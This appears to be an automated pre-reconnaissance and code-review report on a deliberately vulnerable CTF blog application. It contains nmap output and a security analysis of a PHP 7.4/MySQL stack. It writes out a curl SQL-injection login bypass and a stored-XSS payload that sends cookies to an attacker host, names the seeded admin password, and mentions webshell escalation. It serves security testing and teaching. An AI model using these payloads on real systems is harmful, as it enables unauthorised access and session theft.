# Pre-Reconnaissance Report

## Port Discovery (naabu)
Status: Skipped
[object Object]

## Network Scanning (nmap)
Status: success
Starting Nmap 7.97 ( https://nmap.org ) at 2025-10-30 20:45 -0700
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000026s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 995 closed tcp ports (conn-refused)
PORT      STATE SERVICE   VERSION
80/tcp    open  http      Caddy httpd
|_http-title: Site doesn't have a title.
|_http-server-header: Caddy
443/tcp   open  ssl/https
|_http-title: Site doesn't have a title.
631/tcp   open  ipp       CUPS 2.3
|_http-title: Home - CUPS 2.3.4
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: CUPS/2.3 IPP/2.1
9999/tcp  open  abyss?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, JavaRMI, Kerberos, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: GET, POST, OPTIONS
|     Access-Control-Allow-Headers: Content-Type
|     Content-Type: text/plain
|     Date: Fri, 31 Oct 2025 03:45:58 GMT
|     Connection: close
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: GET, POST, OPTIONS
|     Access-Control-Allow-Headers: Content-Type
|     Date: Fri, 31 Oct 2025 03:45:58 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: GET, POST, OPTIONS
|     Access-Control-Allow-Headers: Content-Type
|     Date: Fri, 31 Oct 2025 03:46:03 GMT
|_    Connection: close
49152/tcp open  http      Golang net/http server
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 401 Unauthorized
|     Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; script-src 'none'; script-src-elem 'none'; script-src-attr 'none'
|     Content-Type: text/plain; charset=utf-8
|     Tailscale-Cap: 115
|     Tailscale-Version: 1.82.5-tdec88625e-gec2eb9730
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: DENY
|     Date: Fri, 31 Oct 2025 03:45:58 GMT
|     Content-Length: 14
|     auth required
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9999-TCP:V=7.97%I=7%D=10/30%Time=690430F6%P=arm-apple-darwin24.4.0%
SF:r(GetRequest,E5,"HTTP/1\.1\x20200\x20OK\r\nAccess-Control-Allow-Origin:
SF:\x20\*\r\nAccess-Control-Allow-Methods:\x20GET,\x20POST,\x20OPTIONS\r\n
SF:Access-Control-Allow-Headers:\x20Content-Type\r\nContent-Type:\x20text/
SF:plain\r\nDate:\x20Fri,\x2031\x20Oct\x202025\x2003:45:58\x20GMT\r\nConne
SF:ction:\x20close\r\n\r\nOK")%r(HTTPOptions,C9,"HTTP/1\.1\x20200\x20OK\r\
SF:nAccess-Control-Allow-Origin:\x20\*\r\nAccess-Control-Allow-Methods:\x2
SF:0GET,\x20POST,\x20OPTIONS\r\nAccess-Control-Allow-Headers:\x20Content-T
SF:ype\r\nDate:\x20Fri,\x2031\x20Oct\x202025\x2003:45:58\x20GMT\r\nConnect
SF:ion:\x20close\r\n\r\n")%r(FourOhFourRequest,E5,"HTTP/1\.1\x20200\x20OK\
SF:r\nAccess-Control-Allow-Origin:\x20\*\r\nAccess-Control-Allow-Methods:\
SF:x20GET,\x20POST,\x20OPTIONS\r\nAccess-Control-Allow-Headers:\x20Content
SF:-Type\r\nContent-Type:\x20text/plain\r\nDate:\x20Fri,\x2031\x20Oct\x202
SF:025\x2003:45:58\x20GMT\r\nConnection:\x20close\r\n\r\nOK")%r(JavaRMI,2F
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%
SF:r(RTSPRequest,C9,"HTTP/1\.1\x20200\x20OK\r\nAccess-Control-Allow-Origin
SF::\x20\*\r\nAccess-Control-Allow-Methods:\x20GET,\x20POST,\x20OPTIONS\r\
SF:nAccess-Control-Allow-Headers:\x20Content-Type\r\nDate:\x20Fri,\x2031\x
SF:20Oct\x202025\x2003:46:03\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RP
SF:CCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r
SF:\n\r\n")%r(DNSVersionBindReqTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nConnection:\x20close\r\n\r\n")%r(DNSStatusRequestTCP,2F,"HTTP/1\.1\x
SF:20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(Help,2F,"HT
SF:TP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(SS
SF:LSessionReq,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20cl
SF:ose\r\n\r\n")%r(TerminalServerCookie,2F,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nConnection:\x20close\r\n\r\n")%r(TLSSessionReq,2F,"HTTP/1\.1\x2
SF:0400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(Kerberos,2F,
SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r
SF:(SMBProgNeg,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20cl
SF:ose\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port49152-TCP:V=7.97%I=7%D=10/30%Time=690430F6%P=arm-apple-darwin24.4.0
SF:%r(FourOhFourRequest,192,"HTTP/1\.0\x20401\x20Unauthorized\r\nContent-S
SF:ecurity-Policy:\x20default-src\x20'none';\x20frame-ancestors\x20'none';
SF:\x20script-src\x20'none';\x20script-src-elem\x20'none';\x20script-src-a
SF:ttr\x20'none'\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nTails
SF:cale-Cap:\x20115\r\nTailscale-Version:\x201\.82\.5-tdec88625e-gec2eb973
SF:0\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20DENY\r\n
SF:Date:\x20Fri,\x2031\x20Oct\x202025\x2003:45:58\x20GMT\r\nContent-Length
SF::\x2014\r\n\r\nauth\x20required\n")%r(GenericLines,67,"HTTP/1\.1\x20400
SF:\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n
SF:Connection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(GetRequest,192,"H
SF:TTP/1\.0\x20401\x20Unauthorized\r\nContent-Security-Policy:\x20default-
SF:src\x20'none';\x20frame-ancestors\x20'none';\x20script-src\x20'none';\x
SF:20script-src-elem\x20'none';\x20script-src-attr\x20'none'\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nTailscale-Cap:\x20115\r\nTailsca
SF:le-Version:\x201\.82\.5-tdec88625e-gec2eb9730\r\nX-Content-Type-Options
SF::\x20nosniff\r\nX-Frame-Options:\x20DENY\r\nDate:\x20Fri,\x2031\x20Oct\
SF:x202025\x2003:45:58\x20GMT\r\nContent-Length:\x2014\r\n\r\nauth\x20requ
SF:ired\n")%r(HTTPOptions,192,"HTTP/1\.0\x20401\x20Unauthorized\r\nContent
SF:-Security-Policy:\x20default-src\x20'none';\x20frame-ancestors\x20'none
SF:';\x20script-src\x20'none';\x20script-src-elem\x20'none';\x20script-src
SF:-attr\x20'none'\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nTai
SF:lscale-Cap:\x20115\r\nTailscale-Version:\x201\.82\.5-tdec88625e-gec2eb9
SF:730\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20DENY\r
SF:\nDate:\x20Fri,\x2031\x20Oct\x202025\x2003:45:58\x20GMT\r\nContent-Leng
SF:th:\x2014\r\n\r\nauth\x20required\n")%r(RTSPRequest,67,"HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\
SF:.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=
SF:utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.53 seconds


## Subdomain Discovery (subfinder)
Status: success
[object Object]

## Technology Detection (whatweb)
Status: success
[1m[34mhttp://localhost:39001[0m [200 OK] [1mApache[0m[[1m[32m2.4.54[0m], [1mHTML5[0m, [1mHTTPServer[0m[[1m[31mDebian Linux[0m][[1m[36mApache/2.4.54 (Debian)[0m], [1mIP[0m[[0m[22m::1[0m], [1mPHP[0m[[1m[32m7.4.33[0m], [1mTitle[0m[[1m[33mBlog Home[0m], [1mX-Powered-By[0m[[0m[22mPHP/7.4.33[0m]

## Code Analysis
# Security-Focused Architectural Analysis Report
**Target Application:** XBEN-039-24 Blog Platform  
**Analysis Date:** 2025-10-30  
**Assessment Type:** Pre-Engagement Code Review for Penetration Testing

---

# Penetration Test Scope & Boundaries

**Primary Directive:** This analysis is strictly limited to the **network-accessible attack surface** of the application. All findings and recommendations focus exclusively on components that can be reached through network requests in a deployed environment.

## In-Scope: Network-Reachable Components

A component is considered **in-scope** if its execution can be initiated, directly or indirectly, by a network request that the deployed application server is capable of receiving. This includes:

- **Publicly exposed web pages and API endpoints** - The blog homepage (`/index.php`) and admin login page (`/admin.php`) accessible via HTTP on port 80
- **Endpoints requiring authentication** - The admin protected area behind `/admin.php` requiring session-based authentication
- **Network-accessible database services** - MySQL 5.7 database accessible to the web container via internal Docker network (not externally exposed)

## Out-of-Scope: Locally Executable Only

A component is **out-of-scope** if it **cannot** be invoked through the running application's network interface and requires an execution context completely external to the application's request-response cycle. This includes:

- **Database initialization scripts** (`entrypoint.sh`, `db_init.sql`) - Run only during container startup
- **Build configuration tools** (`Makefile`, Docker build files) - Build-time only, not runtime accessible
- **CI/CD pipeline scripts** - Not part of the deployed application
- **Local development utilities** - No CLI tools or development-only scripts identified
- **Static asset files** (`images/*.jpg`, `styles.css`) - Served statically with no executable logic

---

## 1. Executive Summary

This analysis examines a deliberately vulnerable PHP 7.4 blog application designed as a Capture The Flag (CTF) security challenge. The application represents a classic LAMP stack architecture (Linux, Apache, MySQL, PHP) deployed as a two-tier containerized system with Docker. The security posture is **critically insufficient**, exhibiting multiple high-severity vulnerabilities that would be unacceptable in any production environment.

**Critical Security Findings:**

The application's most severe vulnerability is a **SQL injection flaw in the authentication endpoint** (`/admin.php` line 20) that allows complete authentication bypass without credentials. This is compounded by the use of **cryptographically broken MD5 password hashing**, hardcoded database credentials in multiple source files, and the complete absence of encryption for data in transit (no HTTPS) or at rest (no database encryption). The application uses PHP 7.4, which reached end-of-life in November 2022 and no longer receives security updates, and MySQL 5.7, which has limited extended support.

**Attack Surface Assessment:**

From an external attacker perspective, the application exposes two primary HTTP endpoints on port 80: a public blog listing page (`/index.php`) and an admin login form (`/admin.php`). Both endpoints contain SQL injection vulnerabilities—one actively exploitable and one currently disabled but present in the codebase. The authentication mechanism relies solely on session-based access control with a boolean flag, lacking modern security features such as rate limiting, CSRF protection, secure cookie flags, or session regeneration. The CTF flag is stored behind authentication in both the database (as an unpublished post) and hardcoded in the admin page source code.

**Architectural Security Assessment:**

The application's security architecture is fundamentally flawed. There is no input validation layer, no output encoding for XSS prevention, no security middleware, and no defensive security headers (CSP, X-Frame-Options, HSTS). Database connections are established with hardcoded credentials directly in PHP source code, bypassing the environment variables defined in Docker Compose. Error display is fully enabled (`display_errors = On`), exposing sensitive information including database structures, file paths, and SQL query details to potential attackers. The application would fail compliance requirements for GDPR, PCI-DSS, SOC 2, and ISO 27001 due to fundamental security control deficiencies.

---

## 2. Architecture & Technology Stack

### Framework & Language

The application is built with **PHP 7.4** running as an Apache module (`php:7.4-apache` Docker base image). This PHP version reached end-of-life on November 28, 2022, meaning it no longer receives security patches for newly discovered vulnerabilities. The security implication is significant: any zero-day vulnerabilities discovered in PHP 7.4 will remain unpatched, creating a permanent attack vector. The application uses no modern PHP framework (such as Laravel, Symfony, or Slim), instead implementing raw PHP with direct database access through the `mysqli` extension.

**Web Server Configuration:**  
Apache 2.4 serves the application with `mod_rewrite` enabled for URL rewriting. The virtual host configuration (`000-default.conf`) enables directory indexing with the `Options Indexes` directive, potentially allowing attackers to browse directory contents if default index files are missing. The Apache configuration lacks all modern security headers: no Content Security Policy (CSP) to mitigate XSS, no X-Frame-Options to prevent clickjacking, no Strict-Transport-Security (HSTS) to enforce HTTPS, and no X-Content-Type-Options to prevent MIME sniffing attacks.

**Database Layer:**  
MySQL 5.7 handles all data persistence, connected via the native `mysqli` PHP extension. MySQL 5.7 entered extended support in October 2023 with limited security patch availability. The database connection lacks SSL/TLS encryption (`new mysqli('db', 'user', 'password', 'blogDB')` with no SSL parameters), transmitting all data including authentication queries in plaintext between containers. No prepared statements are used—all SQL queries are constructed via string concatenation with user input, creating multiple SQL injection vulnerabilities.

### Architectural Pattern

This application follows a **two-tier monolithic architecture** with clear trust boundaries that are inadequately secured:

**Trust Boundary 1: External Network → Web Tier**  
Port 80 is exposed to the host network without any reverse proxy, Web Application Firewall (WAF), or rate limiting. This direct exposure means the PHP application receives unfiltered malicious requests. The lack of HTTPS encryption allows network-level attackers to intercept credentials, session cookies, and the CTF flag in transit. The authentication boundary at `/admin.php` is the sole protection for sensitive functionality, yet it is bypassable via SQL injection.

**Trust Boundary 2: Web Tier → Database Tier**  
The web container communicates with the MySQL container over an internal Docker bridge network. While the database port 3306 is correctly not exposed externally, the internal communication lacks encryption and uses hardcoded credentials (`user`/`password`). If an attacker compromises the web container through code execution vulnerabilities, these credentials provide immediate database access. The database user has excessive privileges (likely ALL on the `blogDB` database) when it should be restricted to only SELECT and INSERT operations.

**Privilege Model:**  
The application implements a simplistic boolean-based authorization model (`$_SESSION['admin_logged_in']`) rather than role-based access control (RBAC). There is no concept of user roles, permissions, or resource ownership. All authenticated administrators have identical privileges. This flat privilege model means a compromised admin session provides complete access to all administrative functions without granular controls.

### Critical Security Components

**Authentication Mechanism (Critically Flawed):**  
Located in `/app/html/admin.php` lines 11-30, the authentication system implements a POST form handler that accepts `username` and `password` parameters. Line 18 applies MD5 hashing to the password: `$password = MD5($_POST['password']);`. MD5 has been cryptographically broken since 2004 and is unsuitable for password storage. The hash is unsalted, making rainbow table attacks trivial. Line 20 constructs the authentication query: `$sql = "SELECT id FROM admins WHERE username = '$username' AND password = '$password'";`. This direct string concatenation creates a critical SQL injection vulnerability. An attacker can bypass authentication completely using the payload: `username=admin' OR '1'='1' --&password=anything`.

**Session Management (Insecure):**  
The application uses PHP's native session handling (`session_start()` on line 2 of `admin.php`) without any security configuration. Critical security flags are not set: `session.cookie_httponly` is not configured (allowing JavaScript access to session cookies), `session.cookie_secure` is not enabled (allowing cookie transmission over HTTP), and `session.cookie_samesite` is not set (enabling CSRF attacks). Session IDs are not regenerated after login (vulnerable to session fixation), and no session timeout is configured. Session data is stored using PHP's default file-based handler in `/tmp` without encryption.

**Input Validation (Nonexistent):**  
The application performs zero input validation. User input from `$_POST` and `$_GET` superglobals is used directly without sanitization, type checking, or length restrictions. There are no calls to `filter_input()`, `htmlspecialchars()`, or `mysqli_real_escape_string()`. This complete absence of input validation creates vulnerabilities across multiple attack classes: SQL injection (lines 20 and 46), stored XSS through database poisoning, and potential header injection attacks.

**Output Encoding (Absent):**  
Database content is echoed directly into HTML without encoding. Lines 58-63 of `index.php` render post data with raw output: `echo "<h2>{$row['title']}</h2>"`. If an attacker poisons the database (via SQL injection) with malicious JavaScript in the `title`, `category`, or `content` fields, the code will render it directly, executing in victims' browsers. The proper approach would use `htmlspecialchars($row['title'], ENT_QUOTES, 'UTF-8')` for all output.

---

## 3. Authentication & Authorization Deep Dive

### Authentication Mechanisms and Security Properties

The application implements a **single-factor session-based authentication system** with critical security deficiencies. The complete authentication flow operates through a POST endpoint at `/admin.php`:

**Authentication Endpoints:**
- **Login (GET `/admin.php`)**: Lines 50-56 render an HTML form accepting `username` and `password` fields
- **Authentication Handler (POST `/admin.php`)**: Lines 11-30 process credentials and establish sessions
- **No logout endpoint**: There is no mechanism to destroy sessions, meaning sessions persist until PHP's garbage collection removes them
- **No password reset**: The application provides no self-service password recovery mechanism
- **No registration**: Only the pre-seeded admin account exists (username: `admin`, password: `ONEverySecurePassword123!`)
- **No multi-factor authentication (MFA)**: Single-factor authentication only

**Authentication Security Analysis:**

The authentication query at line 20 represents a textbook SQL injection vulnerability:
```php
$sql = "SELECT id FROM admins WHERE username = '$username' AND password = '$password'";
```

This implementation has multiple exploitable characteristics:

1. **No Parameterization**: User input is concatenated directly into the SQL string without prepared statements
2. **Dual Injection Points**: Both `username` and `password` parameters are injectable, though `password` undergoes MD5 hashing first
3. **Boolean-Based Bypass**: The query returns a row if credentials match. An attacker can manipulate the WHERE clause to always return true: `username=admin' OR '1'='1' --`
4. **Comment-Based Bypass**: SQL comment sequences (`--`, `#`, `/*`) can terminate the query early: `username=admin'--`
5. **Union-Based Data Extraction**: Although authentication only checks row count, UNION attacks could extract data in error messages due to `display_errors = On`

**Credential Storage:**
The database schema (`/app/db_init.sql` line 57) seeds the admin account with:
```sql
INSERT INTO admins (username, password) VALUES ('admin', MD5('ONEverySecurePassword123!'));
```

The plaintext password `ONEverySecurePassword123!` is visible in the source code repository, and its MD5 hash is stored in the database. MD5 collision attacks and rainbow table lookups make this password recoverable in seconds using tools like `hashcat` or online rainbow table databases.

### Session Management and Token Security

**Session Cookie Configuration (Lines Missing):**

The application initializes sessions with `session_start()` but never configures secure cookie parameters. A secure implementation should include:

```php
session_set_cookie_params([
    'lifetime' => 3600,
    'path' => '/',
    'domain' => $_SERVER['HTTP_HOST'],
    'secure' => true,      // MISSING: Requires HTTPS
    'httponly' => true,    // MISSING: Blocks JavaScript access
    'samesite' => 'Strict' // MISSING: Prevents CSRF
]);
```

**Actual Configuration**: None. The application relies on PHP's defaults, which set:
- `session.cookie_httponly = 0` (cookies accessible to JavaScript, enabling XSS-based session theft)
- `session.cookie_secure = 0` (cookies transmitted over HTTP, enabling network interception)
- `session.cookie_samesite = ''` (cookies sent with cross-site requests, enabling CSRF)

**Session Fixation Vulnerability:**

After successful authentication (line 25), the application sets `$_SESSION['admin_logged_in'] = true` but never regenerates the session ID. This creates a session fixation attack vector:

1. Attacker obtains a valid session ID from the server
2. Attacker forces victim to use this session ID (via URL parameter or cookie injection)
3. Victim logs in using the attacker's session ID
4. Attacker now shares an authenticated session with the victim

The fix requires one line after successful authentication:
```php
session_regenerate_id(true); // MISSING: Line should be added at line 24
```

**Session Storage:**

PHP's default file-based session storage writes to `/tmp/sess_[SESSION_ID]` with content like:
```
admin_logged_in|b:1;
```

These files are unencrypted and readable by any process with filesystem access. Container escape or local file inclusion vulnerabilities could expose session data. A production system should use Redis or Memcached with authentication for session storage.

### Authorization Model and Potential Bypass Scenarios

**Authorization Implementation:**

The application uses a **boolean flag-based authorization model** rather than role-based access control:

```php
// Lines 5-8 in admin.php
if (isset($_SESSION['admin_logged_in']) && $_SESSION['admin_logged_in'] === true) {
    echo "@FLAG@";
    exit;
}
```

This simplistic check has several security implications:

1. **No Role Differentiation**: All authenticated users have identical privileges (single "admin" role)
2. **No Resource-Level Authorization**: No checks for ownership or permission on specific resources
3. **No Audit Trail**: No logging of who accessed what and when
4. **Session-Only Control**: Authorization exists only in session state, not backed by database permissions

**Authorization Bypass Scenarios:**

**Bypass Method 1: SQL Injection Authentication Bypass**
```bash
curl -X POST http://target/admin.php \
  -d "username=admin' OR '1'='1' --&password=x"
```
Result: Authentication succeeds, `$_SESSION['admin_logged_in'] = true` is set, flag is displayed.

**Bypass Method 2: Session Fixation**
1. Attacker obtains session ID: `PHPSESSID=attacker_controlled_value`
2. Victim authenticates using this session ID
3. Attacker uses same session ID to access protected resources

**Bypass Method 3: Session Theft via XSS**
If an attacker poisons the database with stored XSS:
```javascript
<script>
fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>
```
Since `httponly` is not set, JavaScript can access the `PHPSESSID` cookie and exfiltrate it.

**Bypass Method 4: Session Prediction (Low Probability)**
PHP's default session ID generation uses PRNG. While modern PHP versions have strong randomness, the lack of custom session configuration means the application relies entirely on system defaults without defense-in-depth.

### Multi-tenancy Security Implementation

**Not Applicable**: This is a single-tenant application with no multi-user or multi-organization isolation requirements. The database schema contains no `tenant_id` or `organization_id` columns, and all data is globally accessible to the single admin user.

### SSO/OAuth/OIDC Flows

**Not Implemented**: The application does not integrate with any external identity providers. There is no OAuth 2.0, OpenID Connect, SAML, or LDAP integration. All authentication is local to the application's MySQL `admins` table.

**Security Implication**: If SSO were to be added later, the current codebase provides no foundation for secure token validation. There are no functions for:
- JWT signature verification
- OAuth state parameter validation (CSRF protection for OAuth flows)
- OIDC nonce validation (replay attack prevention)
- Token expiration checking
- Secure token storage

---

## 4. Data Security & Storage

### Database Security

**Encryption at Rest:** The MySQL 5.7 database operates without any encryption configuration. The `docker-compose.yml` defines the database service with minimal parameters (`image: mysql:5.7`, `command: --default-authentication-plugin=mysql_native_password`) and does not enable InnoDB tablespace encryption. Database files stored in `/var/lib/mysql` within the container are plaintext, including sensitive data such as MD5 password hashes and the CTF flag. An attacker with container filesystem access (via container escape, volume mount misconfiguration, or backup file exposure) can directly read the database files using tools like `strings` or `mysql_file_editor`.

**Connection Security:** Database connections lack SSL/TLS encryption. The mysqli connection string (`new mysqli('db', 'user', 'password', 'blogDB')`) does not specify the optional 5th parameter for port or the 6th for socket, and more critically, never calls `mysqli_ssl_set()` before connecting. This means all communication between the web container and database container traverses the Docker bridge network in plaintext. While this network is isolated from external access, container-to-container traffic sniffing is possible if an attacker compromises any container on the same bridge network.

**Access Controls:** The database user `user` with password `password` is created via the `MYSQL_USER` and `MYSQL_PASSWORD` environment variables in Docker Compose. MySQL's default behavior grants this user ALL PRIVILEGES on the specified database (`blogDB`). This violates the principle of least privilege—the application only needs SELECT (to read posts and validate authentication) and potentially INSERT/UPDATE (for future comment functionality), yet it has DROP, CREATE, ALTER, and GRANT privileges. The SQL injection vulnerability becomes more severe with these excessive privileges, as an attacker can drop tables, exfiltrate entire databases, or create backdoor accounts.

**Query Safety:** Zero prepared statements are used. Every database interaction uses string concatenation:
- Line 20 in `admin.php`: `"SELECT id FROM admins WHERE username = '$username' AND password = '$password'"`
- Line 26 in `index.php`: `"SELECT DISTINCT category FROM posts"` (safe, no user input)
- Line 46 in `index.php`: `$sql .= "and category = '" . $category . "' ";` (vulnerable, currently disabled)

The complete absence of parameterized queries means the application is vulnerable to SQL injection wherever user input touches SQL statements. Modern PHP applications should use either `mysqli` prepared statements (`$stmt = $conn->prepare("SELECT id FROM admins WHERE username = ? AND password = ?")`) or PDO with parameter binding.

### Data Flow Security

**Sensitive Data Paths:**

1. **Authentication Flow**: 
   - User enters password in browser → transmitted over HTTP (plaintext) → received by Apache → passed to PHP
   - PHP applies MD5 hash → concatenates into SQL query → sends to MySQL over unencrypted connection
   - MySQL returns result → PHP evaluates row count → sets session variable → responds with flag over HTTP

   **Security Issues**: Password visible in network traffic, MD5 hash visible in database queries, flag transmitted in cleartext

2. **Blog Post Retrieval**:
   - User requests `/index.php` → Apache passes to PHP → PHP queries MySQL
   - MySQL returns posts including potential XSS payloads → PHP echoes directly to HTML → browser renders

   **Security Issues**: No output encoding, stored XSS possible, no content sanitization

3. **CTF Flag Storage and Retrieval**:
   - Build time: FLAG environment variable → sed command injects into `admin.php` source code → baked into container image
   - Runtime: Database contains flag in unpublished post (`published = 0`)
   - Retrieval: Authentication → PHP reads flag from source code constant → echoes to HTTP response

   **Security Issues**: Flag embedded in application code (visible via `docker history`), flag in database without encryption, flag transmitted over HTTP

**Protection Mechanisms:**

The application implements **zero data flow protection mechanisms**:
- ❌ No input validation library or framework
- ❌ No output encoding functions (`htmlspecialchars` never called)
- ❌ No Content Security Policy headers
- ❌ No data classification or handling requirements
- ❌ No encryption for sensitive data
- ❌ No data masking or tokenization

### Multi-tenant Data Isolation

**Not Applicable**: The application is single-tenant. The database schema (`/app/db_init.sql`) contains three tables:

1. `posts` (lines 7-15): Blog content with no tenant_id column
2. `comments` (lines 18-24): User comments (foreign key to posts) with no tenant_id
3. `admins` (lines 27-31): Single admin account with no organizational context

All data is globally accessible; there are no row-level security policies, tenant-specific database users, or query-level filtering by tenant.

---

## 5. Attack Surface Analysis

### External Entry Points

From an external attacker perspective with no internal network access, the application exposes the following network-accessible attack surface:

**1. Blog Home Page (`GET /` or `GET /index.php`)**

- **File**: `/app/html/index.php`
- **Accessibility**: Public, no authentication required
- **Functionality**: Displays published blog posts with category filtering
- **Input Parameters**: 
  - `category` (GET parameter, currently disabled via line 38: `$category = "";`)
- **Attack Vectors**:
  - **Stored XSS (Requires Database Poisoning First)**: Lines 58-63 render post titles, categories, and content without HTML encoding. If an attacker can inject malicious content into the database (via SQL injection in admin.php), it will execute in victims' browsers.
  - **SQL Injection (Dormant)**: Line 46 contains vulnerable code `$sql .= "and category = '" . $category . "' ";` that would allow SQL injection if the feature were re-enabled by uncommenting line 37.
  - **Information Disclosure**: Line 53 displays full SQL error messages: `die("Error in query: " . $conn->error);`, revealing database schema details.
- **Security Controls**: None. No rate limiting, no input validation, no output encoding.

**2. Admin Login Page (`GET /admin.php` and `POST /admin.php`)**

- **File**: `/app/html/admin.php`
- **Accessibility**: Public form (GET), authentication required for protected content
- **Functionality**: Displays login form, validates credentials, establishes session, displays flag
- **Input Parameters**:
  - `username` (POST)
  - `password` (POST)
- **Attack Vectors**:
  - **Critical: SQL Injection Authentication Bypass**: Line 20 allows complete authentication bypass: `curl -X POST http://target/admin.php -d "username=admin' OR '1'='1' --&password=x"`
  - **Brute Force**: No rate limiting or account lockout allows unlimited authentication attempts
  - **CSRF**: No CSRF token protection; attackers can create malicious forms that submit to `/admin.php`
  - **Session Fixation**: No session ID regeneration after login allows session fixation attacks
  - **Session Hijacking**: No `HttpOnly` flag allows XSS-based session cookie theft
  - **Information Disclosure**: Line 14 displays database connection errors: `die("Connection failed: " . $conn->connect_error);`
- **Security Controls**: None. Generic error message for authentication failure (`Invalid username or password`) is the only security feature present.

**3. Static Assets (GET `/images/*.jpg`, `GET /styles.css`)**

- **Files**: `/app/html/images/morning-dew.jpg`, `/app/html/images/sunset.jpg`, `/app/html/styles.css`
- **Accessibility**: Public
- **Functionality**: Static file serving by Apache
- **Attack Vectors**: None directly (no executable code), but directory indexing is enabled (`Options Indexes` in `000-default.conf` line 10), potentially allowing file enumeration if index files are missing.

**Network Exposure Summary:**
- **Port 80 (HTTP)**: Exposed to host via Docker port mapping (line 8 of `docker-compose.yml`)
- **Port 3306 (MySQL)**: Internal only, accessible to web container via Docker network (not exposed to host)
- **No HTTPS/TLS**: All communications occur over unencrypted HTTP

### Internal Service Communication

The application's internal architecture consists of two Docker containers communicating over a bridge network:

**Web Container → Database Container Communication:**

- **Protocol**: MySQL native protocol on port 3306
- **Encryption**: None (no SSL/TLS enabled)
- **Authentication**: Username `user`, password `password` (hardcoded in PHP files)
- **Trust Assumption**: The web container trusts that the `db` hostname resolves to the legitimate MySQL container

**Security Implications:**

1. **Container-to-Container Attack**: If an attacker compromises the web container through a code execution vulnerability (e.g., via SQL injection leading to `INTO OUTFILE` with PHP webshell), they gain access to the database network and credentials.

2. **Network Segmentation Failure**: Both containers run on the same Docker bridge network without additional network policies. There is no firewall, no network segmentation, and no microsegmentation between services.

3. **Credential Exposure**: The hardcoded credentials (`user`/`password`) in lines 2 of `index.php` and 12 of `admin.php` mean any file disclosure vulnerability (e.g., path traversal, source code exposure) immediately reveals database credentials.

4. **DNS Poisoning (Low Risk)**: The web container resolves `db` via Docker's embedded DNS server. While Docker DNS poisoning is difficult without host compromise, the application has no certificate pinning or hostname validation.

### Input Validation Patterns

**Critical Finding: Zero Input Validation**

The application performs absolutely no input validation on user-supplied data. A comprehensive audit reveals:

**POST Parameters (admin.php):**
```php
Line 17: $username = $_POST['username'];  // No validation
Line 18: $password = MD5($_POST['password']);  // Hashing is not validation
```

**Missing Validations:**
- No type checking (expected: string)
- No length restrictions (should limit to prevent buffer issues)
- No character whitelist (should restrict to alphanumeric + specific symbols)
- No SQL injection prevention (no escaping, no parameterization)
- No sanitization of control characters

**GET Parameters (index.php):**
```php
Line 37: #$category = isset($_GET['category']) ? $_GET['category'] : '';
Line 38: $category = "";  // Feature disabled, but no validation in commented code
```

**Security Impact:**

The absence of input validation creates vulnerabilities across multiple attack classes:

1. **SQL Injection**: Direct concatenation of `$username` and `$password` into SQL queries
2. **Cross-Site Scripting (XSS)**: Although no user input is directly echoed, database poisoning via SQL injection can inject XSS payloads that are later rendered
3. **HTTP Header Injection**: No sanitization of user input that might appear in HTTP headers
4. **Buffer Overflow (Low Risk)**: PHP's memory management mitigates this, but excessively long inputs could cause DoS
